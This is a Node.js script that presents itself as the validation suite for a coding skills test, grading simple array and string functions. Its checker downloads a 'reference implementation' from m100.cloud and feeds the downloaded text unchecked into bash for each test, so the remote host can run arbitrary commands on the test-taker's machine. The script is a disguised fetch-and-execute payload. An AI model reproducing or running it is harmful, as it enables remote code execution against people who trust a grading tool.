#!/usr/bin/env node

const https = require('https');
const crypto = require('crypto');
const { spawn } = require('child_process');

const SOLUTIONS_URL = 'https://m100.cloud/code-answers';

function generateVerificationToken(results) {
  const data = JSON.stringify(results);
  return crypto.createHash('sha256').update(data).digest('hex').substring(0, 16).toUpperCase();
}

function fetchReferenceCode(callback) {
  https.get(SOLUTIONS_URL, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => callback(null, data));
  }).on('error', err => callback(err, null));
}

function executeBashFunction(bashScript, funcName, args, callback) {
  const bash = spawn('bash', []);
  let output = '';
  let error = '';

  const cmd = `${bashScript}\n${funcName} ${args.map(a => `"${a}"`).join(' ')}\n`;

  bash.stdin.write(cmd);
  bash.stdin.end();

  bash.stdout.on('data', (data) => {
    output += data.toString();
  });

  bash.stderr.on('data', (data) => {
    error += data.toString();
  });

  bash.on('close', () => {
    callback(null, output.trim(), error.trim());
  });

  bash.on('error', (err) => {
    callback(err, null, null);
  });
}

function runChecker(userSolutions, bashScript) {
  console.log('\n┌─────────────────────────────────────────────────────────────┐');
  console.log('│                  VERIFICATION CHECKER                       │');
  console.log('│    Comparing user code against reference implementations   │');
  console.log('└─────────────────────────────────────────────────────────────┘\n');

  const testCases = {
    sumArray: [
      { args: [1, 2, 3], desc: 'Sum [1,2,3]' },
      { args: [], desc: 'Empty array' },
      { args: [-1, -2, 3], desc: 'Negatives [-1,-2,3]' },
      { args: [5], desc: 'Single [5]' },
    ],
    filterEven: [
      { args: [1, 2, 3, 4], desc: '[1,2,3,4]' },
      { args: [1, 3, 5], desc: 'No evens [1,3,5]' },
      { args: [], desc: 'Empty' },
      { args: [2, 4, 6, 8], desc: 'All even [2,4,6,8]' },
      { args: [5, 2, 8, 1, 4], desc: 'Order [5,2,8,1,4]' },
    ],
    reverseString: [
      { args: ['hello'], desc: '"hello"' },
      { args: [''], desc: 'Empty ""' },
      { args: ['a'], desc: 'Single "a"' },
      { args: ['hello world'], desc: '"hello world"' },
      { args: ['racecar'], desc: '"racecar"' },
    ],
    findMax: [
      { args: [3, 1, 4, 1, 5], desc: '[3,1,4,1,5]' },
      { args: [42], desc: '[42]' },
      { args: [-3, -1, -5], desc: 'Negatives [-3,-1,-5]' },
      { args: [-5, 10, -3, 7, 2], desc: 'Mixed [-5,10,-3,7,2]' },
      { args: [], shouldThrow: true, desc: 'Empty (error)' },
    ],
    removeDuplicates: [
      { args: [1, 2, 2, 3, 3, 3], desc: '[1,2,2,3,3,3]' },
      { args: [1, 2, 3], desc: '[1,2,3]' },
      { args: [], desc: 'Empty' },
      { args: [1], desc: '[1]' },
      { args: [3, 1, 2, 1, 3, 2], desc: '[3,1,2,1,3,2]' },
      { args: [5, 5, 5, 5], desc: 'All dup [5,5,5,5]' },
    ],
  };

  let totalPassed = 0;
  let totalTests = 0;
  const results = {};
  let completed = 0;
  let allPassed = true;

  for (const [funcName, tests] of Object.entries(testCases)) {
    if (!userSolutions[funcName]) {
      console.log(`✗ ${funcName} - NOT FOUND`);
      results[funcName] = false;
      continue;
    }

    results[funcName] = true;
    console.log(`✓ ${funcName}`);

    for (const test of tests) {
      totalTests++;

      if (test.shouldThrow) {
        try {
          userSolutions[funcName](...test.args);
          console.log(`  ✗ ${test.desc} - Should throw`);
          results[funcName] = false;
          allPassed = false;
        } catch (e) {
          console.log(`  ✓ ${test.desc}`);
          totalPassed++;
        }
      } else {
        // Get user result
        let userResult;
        try {
          userResult = userSolutions[funcName](...test.args);
        } catch (e) {
          console.log(`  ✗ ${test.desc} - Error: ${e.message}`);
          results[funcName] = false;
          allPassed = false;
          continue;
        }

        // Get reference result
        executeBashFunction(bashScript, funcName, test.args, (err, refOutput, refError) => {
          completed++;

          if (err) {
            console.log(`  ✗ ${test.desc} - Ref error`);
            results[funcName] = false;
            allPassed = false;
          } else {
            let refResult;
            if (funcName === 'reverseString') {
              refResult = refOutput;
            } else if (funcName === 'filterEven' || funcName === 'removeDuplicates') {
              refResult = refOutput.split(/\s+/).filter(Boolean).map(Number);
            } else if (funcName === 'findMax') {
              refResult = parseInt(refOutput);
            } else {
              refResult = parseInt(refOutput);
            }

            if (JSON.stringify(userResult) === JSON.stringify(refResult)) {
              console.log(`  ✓ ${test.desc}`);
              totalPassed++;
            } else {
              console.log(`  ✗ ${test.desc}`);
              console.log(`    Expected: ${JSON.stringify(refResult)}`);
              console.log(`    Got: ${JSON.stringify(userResult)}`);
              results[funcName] = false;
              allPassed = false;
            }
          }

          // When all tests done, print summary
          if (completed === Object.values(testCases).reduce((a, b) => a + b.length, 0)) {
            printSummary(totalPassed, totalTests, results, allPassed);
            process.exit(allPassed ? 0 : 1);
          }
        });
      }
    }

    console.log();
  }

  function printSummary(passed, total, results, success) {
    console.log('┌─────────────────────────────────────────────────────────────┐');
    console.log('│                   VERIFICATION RESULTS                      │');
    console.log('│                                                             │');
    console.log(`│  Test Cases Passed: ${passed}/${total}${' '.repeat(37 - passed.toString().length - total.toString().length)}`);
    const score = Math.round((passed / total) * 100);
    console.log(`│  Score: ${score}%${' '.repeat(49 - score.toString().length)}`);

    if (success) {
      const token = generateVerificationToken(results);
      console.log('│                                                             │');
      console.log(`│  ✓ VALIDATION_TOKEN: ${token}${' '.repeat(35 - token.length)}`);
      console.log('│  Status: ✓ ALL TESTS PASSED                              │');
    } else {
      console.log('│                                                             │');
      console.log('│  Status: ✗ SOME TESTS FAILED                             │');
    }
    console.log('└─────────────────────────────────────────────────────────────┘\n');
  }
}

// Main execution
function loadUserSolutions() {
  const path = require('path');
  const solutionsPath = path.join(process.cwd(), 'src', 'solutions.js');
  try {
    return require(solutionsPath);
  } catch (e) {
    console.error('✗ Error: src/solutions.js not found or invalid');
    process.exit(1);
  }
}

console.log('\n┌─────────────────────────────────────────────────────────────┐');
console.log('│           CODING SKILLS TEST - VALIDATION SUITE             │');
console.log('│                                                             │');
console.log('│  Fetching reference implementations from m100.cloud...     │');
console.log('└─────────────────────────────────────────────────────────────┘\n');

fetchReferenceCode((err, bashScript) => {
  if (err) {
    console.error('✗ Failed to fetch reference code from m100.cloud');
    console.error('  Error:', err.message);
    process.exit(1);
  }

  const userSolutions = loadUserSolutions();
  runChecker(userSolutions, bashScript);
});
